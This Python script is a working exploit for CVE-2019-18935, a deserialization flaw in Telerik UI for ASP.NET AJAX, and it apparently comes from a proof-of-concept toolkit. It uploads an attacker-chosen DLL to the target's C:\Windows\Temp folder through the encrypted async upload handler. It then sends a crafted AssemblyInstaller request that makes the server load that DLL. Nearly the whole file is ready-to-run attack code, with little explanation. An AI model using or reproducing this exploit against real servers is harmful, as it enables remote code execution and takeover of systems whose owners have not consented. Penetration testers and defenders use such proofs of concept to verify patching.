#!/usr/bin/env python3

# Import encryption routines.
from sys import path

from requests.packages.urllib3 import exceptions
from Tools.PocSuite.init_pocs.cve_2019_18935.RAU.RAU_crypto import RAUCipher

from argparse import ArgumentParser
from json import dumps, loads
from os.path import basename, splitext
from pprint import pprint
from requests import post
from requests.packages.urllib3 import disable_warnings
from sys import stderr
from time import time
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(category=InsecureRequestWarning)

def send_request(files):
    global temp_target_folder, ui_version, net_version, filename_remote, filename_local, url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Connection': 'close',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }
    response = post(url, files=files, verify=False, headers=headers)
    try:
        result = loads(response.text)
        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))
        print(result)
    except:
        print(response.text)

def build_raupostdata(object, type):
    return RAUCipher.encrypt(dumps(object)) + '&' + RAUCipher.encrypt(type)

def upload():
    global temp_target_folder, ui_version, net_version, filename_remote, filename_local, url
    # Build rauPostData.
    object = {
        'TargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(''), ui_version),
        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder), ui_version),
        'MaxFileSize': 0,
        'TimeToLive': {  # These values seem a bit arbitrary, but when they're all set to 0, the payload disappears shortly after being written to disk.
            'Ticks': 1440000000000,
            'Days': 0,
            'Hours': 40,
            'Minutes': 0,
            'Seconds': 0,
            'Milliseconds': 0,
            'TotalDays': 1.6666666666666666,
            'TotalHours': 40,
            'TotalMinutes': 2400,
            'TotalSeconds': 144000,
            'TotalMilliseconds': 144000000
        },
        'UseApplicationPoolImpersonation': False
    }
    type = 'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=' + ui_version + ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
    raupostdata = build_raupostdata(object, type)
    
    with open(filename_local, 'rb') as f:
        payload = f.read()
    
    metadata = {
        'TotalChunks': 1,
        'ChunkIndex': 0,
        'TotalFileSize': 1,
        'UploadID': filename_remote  # Determines remote filename on disk.
    }
    
    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),
        'file': (filename_remote, payload, 'application/octet-stream'), # noi dung
        'fileName': (None, filename_remote),
        'contentType': (None, 'application/octet-stream'),
        'lastModifiedDate': (None, '2020-01-01T00:00:00.000Z'),
        'metadata': (None, dumps(metadata))
    }
    
    # Send request.
    print('[*] Local payload name: ', filename_local, file=stderr)
    print('[*] Destination folder: ', temp_target_folder, file=stderr)
    print('[*] Remote payload name:', filename_remote, file=stderr)
    print(file=stderr)
    send_request(files)

def deserialize():
    global temp_target_folder, ui_version, net_version, filename_remote, filename_local, url
    # Build rauPostData.
    if int(ui_version.split('.')[0]) > 2017: 
        extention = '.tmp'
    else:
        extention = ''

    object = {
        'Path': 'file:///' + temp_target_folder.replace('\\', '/') + '/' + filename_remote + extention
    }
    type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=' + net_version + ', Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
    raupostdata = build_raupostdata(object, type)
    
    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),  # Only need this now.
        '': ''  # One extra input is required for the page to process the request.
    }
    
    # Send request.
    print('\n[*] Triggering deserialization for .NET v' + net_version + '...\n', file=stderr)
    start = time()
    send_request(files)
    end = time()
    print('\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)
def run(version, payload, surl):
    global temp_target_folder, ui_version, net_version, filename_remote, filename_local, url
    temp_target_folder = "C:\Windows\Temp".replace('/', '\\')
    ui_version = version
    net_version = "4.0.0.0"
    filename_local = payload
    filename_remote = filename_local.split("/")[-1]
    url = surl
    print(surl)
    #print(filename_remote)
    upload()

   
    deserialize()

if __name__ == '__main__':
    parser = ArgumentParser(description='Exploit for CVE-2019-18935, a .NET deserialization vulnerability in Telerik UI for ASP.NET AJAX.')
    parser.add_argument('-t', dest='test_upload', action='store_true', help="just test file upload, don't exploit deserialization vuln")
    parser.add_argument('-v', dest='ui_version', required=False, help='software version', default='2012.3.1205')#2018.2.910 #2012.3.1205
    parser.add_argument('-n', dest='net_version', default='4.0.0.0', help='.NET version')
    parser.add_argument('-p', dest='payload', required=False, help='mixed mode assembly DLL', default='sleep_2020051515044747_amd64.dll')
    parser.add_argument('-f', dest='folder', required=False, help='destination folder on target', default= 'C:\Windows\Temp') #C:\Windows\Temp
    parser.add_argument('-u', dest='url', required=False, help='https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau', default= 'http://192.168.133.140/CVE3/Telerik.Web.UI.WebResource.axd?type=rau') #http://192.168.8.101:8123/Telerik.Web.UI.WebResource.axd?type=rau
    args = parser.parse_args()

    temp_target_folder = args.folder.replace('/', '\\')
    ui_version = args.ui_version
    net_version = args.net_version
    filename_local = args.payload
    filename_remote = filename_local#str(time()) + splitext(basename(filename_local))[1]
    url = args.url

    upload()

    if not args.test_upload:
        deserialize()
